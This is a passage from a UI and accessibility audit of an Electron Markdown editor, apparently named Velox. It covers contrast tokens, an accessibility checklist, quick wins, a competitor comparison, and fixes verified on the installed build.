| scrollbar thumb | `#64748B` | **3.87** ✓ 3:1 | Rest thumb; hover `--text-tertiary` |
| md body | `#E2E8F0` | **14.95** | Preview paragraph text |
| md inline code | `#7DD3FC` | **9.31** on `#1B2436` | Backtick spans |

Light theme — on `--surface-0 #FFFFFF` unless noted:

| Token | Hex | Ratio vs bg | Use |
|---|---|---|---|
| `--surface-0/1/2/3/4` | `#FFFFFF` / `#F8FAFC` / `#F1F5F9` / `#E8EDF4` / `#DCE3EC` | — | Page / chrome / cards / hover / pressed |
| `--border-subtle/default/strong` | `#EEF2F7` / `#D9E1EC` / `#B9C4D4` | 1.26 / 1.69 decorative | Same roles as dark |
| `--text-primary` | `#0F172A` | **17.85** | Headings, body |
| `--text-secondary` | `#475569` | **7.24** on surf-1 | Subtitles, icons |
| `--text-tertiary` | `#64748B` | **4.76** surf-0 / **4.55** surf-1 / 4.34 surf-2 | Metadata; on surf-2 use secondary |
| `--accent-700` | `#0369A1` | **5.93** | **All** light accent text + links (replaces failing `#0284c7`) |
| `--accent-600` | `#0284C7` | 4.10 UI-only | Large fills only, never body text |
| solid button | white on `#0369A1` | **5.93** | Replaces 4.10 `bg-sky-600` (C3) |
| `--success/warning/danger-400` | `#047857` / `#B45309` / `#B91C1C` | **5.48 / 5.02 / 6.47** | Status, incl. light "Unsaved" (was 3.19) |
| gutter numerals | `#64748B` on surf-1 | **4.55** | Gutter must sit on `--surface-1`, not `-2` (was 2.34) |
| md inline code | `#0369A1` on `#F1F5F9` | **5.42** | Backtick spans (already passes — keep) |

Hard rules: one accent hue family; `sky-600`-as-text is banned in light; `slate-500`-as-text is banned on dark; borders never carry meaning alone (pair with surface change).

## ACCESSIBILITY CHECKLIST

| Check | Status | Evidence | Fix |
|---|---|---|---|
| Visible focus on all controls | FAIL | 7× `outline-none`, 0 `focus-visible` (I1) | Global `:focus-visible` 2px `accent-400` rule; delete all `outline-none` |
| Modal roles + `aria-modal` | FAIL | 5 modals = anonymous divs (A1) | Shared `Dialog` primitive with `role="dialog" aria-modal labelledby` |
| Modal focus trap | FAIL | Tab escapes into obscured UI (A1) | Trap in `Dialog`; Lightbox gets arrow-key pan/zoom |
| Modal Escape | FAIL | 1 of 5 closable (`CommandPalette.tsx:178` only) | `Dialog` handles Escape globally (A4) |
| Focus return to trigger | FAIL | Focus drops to `<body>` on close | `prev.current?.focus()` in `Dialog` cleanup |
| Tab-bar semantics | FAIL | Docs = `<div onClick>`, Home = `<button>` (`TabBar.tsx:29-60`) | `role=tablist/tab`, `aria-selected`, roving tabindex (A2) |
| Tab keyboard nav | FAIL | No arrows/Home/Delete; no Ctrl+Tab | Arrow/Home/Delete on tablist + Ctrl+Tab/1-9 (A2) |
| Palette combobox semantics | FAIL | No listbox/option/activedescendant (A9) | `combobox` + `listbox` + clamped index |
| Icon-button names | FAIL | 73 buttons, `title` only, 0 `aria-label` (A5) | `aria-label` + `aria-hidden` on glyphs |
| Every feature keyboard-operable | FAIL | Find bar preview-mode dead, tab strip unfocusable, snippet rows are divs | E7 fix, A2 fix, A8 buttons |
| `prefers-reduced-motion` | FAIL | 0 occurrences; confetti + 4 pulses + bounce | Media-query kill-switch + `MotionConfig reducedMotion="user"` (A6) |
| No keyboard trap | FAIL | Tab trapped in textarea (A7) | Shift+Tab escapes; multi-line indent; document `Ctrl+Enter` exit |
| Status not colour-only | PARTIAL | Dirty dot is colour+position but no text for SR; tab dot has `title` only | Add `sr-only` "(unsaved changes)" to dots (A2 fix shows pattern) |
| Text-size floor | FAIL | `text-[10px]` ×7, `text-[11px]` ×22 (T1) | Delete both; `text-2xs` 11px minimum |
| Contrast AA body text | PASS* | Body pairs pass (14.95/17.85); *metadata fails 20 sites* | `text-slate-500`→tertiary (C2); solid-button swap (C3) |
| Link purpose/announcement | FAIL | No external indicator; links navigate window (MD8) | `target=_blank rel=noopener` + external glyph + shell handler |
| Table scroll keyboard access | FAIL | Tables have no scroll container (MD10) | `tabindex=0 role=region aria-label` wrapper |
| Live-region announcements | FAIL | Toast has no `role=status`; errors silent (I4, I7) | `role=status`/`role=alert` notice host |
| Touch target size | FAIL | 22px and 18px targets (I5) | 28px minimum, `w-7 h-7` |
| `lang`, title, landmarks | PARTIAL | `lang="en"` + title OK; `main` unlabeled; heading order breaks per view | `aria-label` on `main`, per-view visually-hidden `h1` (A10) |

## QUICK WINS

1. Delete `select-none` from `<body>` (`index.html:31`) and add `select-text` to the preview container (`MarkdownPreview.tsx:144`) — makes document text selectable in 2 edits.
2. Add `@custom-variant dark (&:where(.dark, .dark *));` to `index.css:1` — fixes all 18 OS-driven `dark:` colours instantly.
3. Replace every `text-slate-500` on dark surfaces with `text-[var(--text-tertiary)]` (~20 sites: `HomePage`, `CommandPalette:264`, `ShortcutsModal:243`, `ExportModal:118,148,178`, `SampleFilesModal:67`) — clears the largest contrast-fail cluster.
4. Change all `bg-sky-600 text-white` 12px selections/buttons to `bg-[var(--accent-700)]` in light / `bg-[var(--accent-500)] text-[var(--surface-0)]` in dark (`CommandBar:154,169,184`, `RawEditor:306`, `HomePage:113,252,399,501`) — 4.10→5.9+.
5. Set `breaks: false` (`markdown.ts:6`) — single-line change that makes every preview match GitHub.
6. Unify the four chrome insets to `px-4` (`TitleBar:37`, `TabBar:25`, `CommandBar:79`, `StatusBar:26`).
7. Set gutter to `text-[var(--text-tertiary)] tabular-nums` and move light gutter onto `--surface-1` (`RawEditor.tsx:328`) — 2.34→4.55.
8. Delete both `confetti()` calls (`App.tsx:454,555`) — removes the toy signal and the reduced-motion violation in 4 lines.
9. Delete all 11 dead `animate-in/fade-in/zoom-in-95/slide-in-from-bottom-2` classes and add a real 150ms opacity transition via the `Dialog` primitive (A1) — modals stop popping.
10. Replace `📝` (`MarkdownPreview:127`), `🔍` (`markdown.ts:21`), `↳` (`RawEditor:293`) with `FileText`, `Maximize2`, `CornerDownRight` glyphs.
11. Delete `hover:scale-[1.02]` (`HomePage:113`), `hover:translate-y-[-2px]` (`HomePage:317`), image `scale(1.015)` + blue glow (`index.css:325-328`) — kills the floaty hover language.
12. Change preview container to `max-w-[68ch] px-8 py-10` (`MarkdownPreview.tsx:144`) — fixes the 102-char measure everywhere.
13. Add the global `:focus-visible` rule and delete all 7 `outline-none` (I1) — keyboard users can see focus in one CSS block.
14. Add `role="status"` to the toast host and `role="alert"` for errors (`App.tsx:925-934`) + surface one error path (e.g. failed disk write, `App.tsx:463-465`).
15. Add `@media print { header, [role=tablist], aside, footer, .no-print { display: none } }` — currently `window.print()` prints the entire app chrome.

## COMPETITIVE BENCHMARK

Velox ratings: MISSING / WEAK / OK / STRONG.

| Capability | Velox | Typora | Obsidian | MarkText | VS Code preview |
|---|---|---|---|---|---|
| Live WYSIWYG editing | MISSING (plain textarea) | STRONG | STRONG (Live Preview) | STRONG | N/A (split only) |
| Source syntax highlighting | MISSING | STRONG | STRONG | STRONG | STRONG |
| Split resize + collapse | MISSING (fixed 50/50, S3) | OK (fixed-ish) | STRONG | OK | STRONG |
| Outline / TOC sidebar | MISSING (MD11) | STRONG | STRONG | OK | OK (Outline view) |
| Reading measure / rhythm | WEAK (102ch, uneven, T2/T3) | STRONG | STRONG | STRONG | OK |
| GFM fidelity (`breaks`, tables) | WEAK (`breaks:true`, MD1/MD10) | STRONG | STRONG | STRONG | STRONG |
| Code-block UX (copy, lang, lines) | OK (copy works; 36px pad, MD4) | STRONG | STRONG | OK | OK |
| Task-list interactivity | OK (toggles; corrupts fences, MD12) | STRONG | STRONG | STRONG | WEAK (read-only) |
| Find/replace in editor | WEAK (no regex/case, E-find) | OK | STRONG | OK | STRONG |
| Undo/redo reliability | MISSING (E5) | STRONG | STRONG | STRONG | STRONG |
| Export (PDF/HTML/DOCX) | OK (md/html/print) | STRONG | STRONG | OK | WEAK (needs ext) |
| Cross-file search + jump-to-line | STRONG (genuinely good) | WEAK | STRONG | WEAK | STRONG |

Verdict: Velox's full-text search with line jump is its one STRONG differentiator. Everything a premium editor is judged on — editing surface, measure, GFM fidelity, outline, undo — is MISSING or WEAK. Close MD1, E1, E5, S3, U7 first; they are the gap between "viewer with a textarea" and "editor".


---

## 7. Field-report round - installed-build verification

Findings below were reported against the installed application (not the source
tree) after Phases 1-4, each reproduced or confirmed before fixing. Severity and
format follow the rest of this report. Status: FIXED unless noted.

### [CRITICAL] V1. Light-mode blockquote text invisible
- **Seen in:** installed app, light theme, any document containing a > quote
- **Cause:** the markdown engine had moved into @layer components, where
  utilities beat theme rules regardless of specificity. The blockquote renderer
  emitted 	ext-slate-300, which the theme CSS could no longer override - so
  light-mode quotes rendered near-white on near-white.
- **User-visible impact:** quoted text unreadable in light mode; looked like
  empty boxes.
- **Fix:** generated markup owns structure only; theme CSS owns all color
  (src/services/markdown.ts, src/index.css). Proven with computed styles in
  both themes via Electron, and the pixel-proof fixture now mirrors real
  renderer output in both themes so this class of regression is caught.

### [HIGH] V2. Theme toggle hidden behind native caption buttons
- **Seen in:** installed app, any DPI scaling that rounds the 140px reserve down
- **Cause:** the Window Controls Overlay draws ~138px of caption buttons over
  the header, and the reserve left ~2px of clearance.
- **User-visible impact:** the Light/Dark toggle slid underneath Minimize.
- **Fix:** reserve raised to 148px, plus a runtime measurement via
  
avigator.windowControlsOverlay.getTitlebarAreaRect() that sets the exact
  reserve on mount and resize (src/App.tsx), with the CSS value as fallback.

### [HIGH] V3. Double-clicking a .md opened the app but not the file
- **Seen in:** installed app after a correct file association
- **Cause:** Windows passes the path as argv, and nothing consumed it: no
  process.argv handling, no single-instance lock, no renderer delivery path.
- **User-visible impact:** the app opened to Home with the document discarded.
- **Fix:** validated argv extraction, single-instance lock with second-instance
  forwarding, a pending-open queue consumed on mount or pushed live, and a
  narrow elox.app bridge (lectron/ipc.cjs, lectron/main.cjs,
  lectron/preload.cjs, src/types/ipc.ts, src/App.tsx). Covered by argv
  extraction cases and staged queued/pushed opens in the Electron smoke suite.

### [HIGH] V4. Tabs could not be reordered and overflowed without recourse
- **Seen in:** installed app with many open tabs
- **Cause:** fixed order, and a scrollbar-hidden strip with no arrow buttons or
  wheel mapping, so tabs past the edge were unreachable.
- **User-visible impact:** no way to organize or reach tabs.
- **Fix:** drag-and-drop reorder with drop indicator, Alt+Arrow keyboard move,
  chevron buttons that appear only on overflow, and vertical-wheel mapping
  (src/components/TabBar.tsx, handleMoveTab in src/App.tsx).

### [MEDIUM] V5. Hero logo washed out in light mode
- **Seen in:** installed app, Home, light theme
- **Cause:** the mark's mid-blue gradients sit on a pale blue chip.
- **User-visible impact:** logo barely visible.
- **Fix:** light-mode chip is a dark tile, presenting the mark like an app icon.
  No change in dark mode (src/components/HomePage.tsx).

### [MEDIUM] V6. Home and toolbar labels too small
- **Seen in:** installed app, Home hero and toolbar (Save/New)
- **Cause:** 12px labels throughout.
- **User-visible impact:** requested +1-2pt.
- **Fix:** toolbar action labels and section headers to 14px, hero title already
  at 30px. Data-density text (tables, metadata badges) intentionally unchanged.